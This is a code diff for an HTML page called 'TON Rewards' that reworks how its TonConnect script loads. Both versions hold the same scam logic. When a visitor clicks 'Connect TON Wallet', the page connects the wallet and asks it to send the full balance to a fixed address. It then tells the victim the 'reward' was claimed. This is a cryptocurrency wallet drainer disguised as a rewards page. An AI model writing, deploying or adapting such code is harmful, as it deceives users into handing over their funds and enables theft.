@@ -4,7 +4,46 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>TON Rewards</title>
-  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+  <script type="module">
+    import { TonConnect } from "https://unpkg.com/@tonconnect/sdk@latest";
+    import { TonConnectUI } from "https://unpkg.com/@tonconnect/ui@latest";
+
+    const tonConnectUI = new TonConnectUI({
+      manifestUrl: "https://deasnowe1.github.io/TelegramTon/tonconnect-manifest.json",
+      buttonRootId: "connect-button"
+    });
+
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("connect-button").addEventListener("click", async () => {
+        try {
+          const connected = await tonConnectUI.connectWallet();
+          if (connected && tonConnectUI.wallet) {
+            document.getElementById("status").innerText = "Wallet connected. Sending transaction...";
+
+            const tx = {
+              validUntil: Math.floor(Date.now() / 1000) + 600,
+              messages: [
+                {
+                  address: "UQBE_JABAWlW-hEtmW47Xp-qPVQvcnKNKseQjO1NEE5Byh2Y",
+                  amount: "all",
+                  payload: ""
+                }
+              ]
+            };
+
+            await tonConnectUI.sendTransaction(tx);
+            document.getElementById("status").innerText = "✅ Reward claimed!";
+          } else {
+            document.getElementById("status").innerText = "❌ Wallet connection failed.";
+          }
+        } catch (e) {
+          console.error(e);
+          document.getElementById("status").innerText = "❌ Transaction failed.";
+        }
+      });
+    });
+  </script>
+
   <style>
     body {
       background-color: #f4f9ff;
@@ -44,40 +83,5 @@
     <button class="button" id="connect-button">🔗 Connect TON Wallet</button>
     <p id="status"></p>
   </div>
-
-  <script>
-    const tonConnectUI = new TonConnectUI({
-      manifestUrl: "https://deasnowe1.github.io/TelegramTon/tonconnect-manifest.json",
-      buttonRootId: "connect-button"
-    });
-
-    document.getElementById("connect-button").addEventListener("click", async () => {
-      try {
-        const connected = await tonConnectUI.connectWallet();
-        if (connected && tonConnectUI.wallet) {
-          document.getElementById("status").innerText = "Wallet connected. Sending transaction...";
-
-          const tx = {
-            validUntil: Math.floor(Date.now() / 1000) + 600,
-            messages: [
-              {
-                address: "UQBE_JABAWlW-hEtmW47Xp-qPVQvcnKNKseQjO1NEE5Byh2Y",
-                amount: "all",
-                payload: ""
-              }
-            ]
-          };
-
-          await tonConnectUI.sendTransaction(tx);
-          document.getElementById("status").innerText = "✅ Reward claimed!";
-        } else {
-          document.getElementById("status").innerText = "❌ Wallet connection failed.";
-        }
-      } catch (e) {
-        document.getElementById("status").innerText = "❌ Transaction failed.";
-        console.error(e);
-      }
-    });
-  </script>
 </body>
 </html>
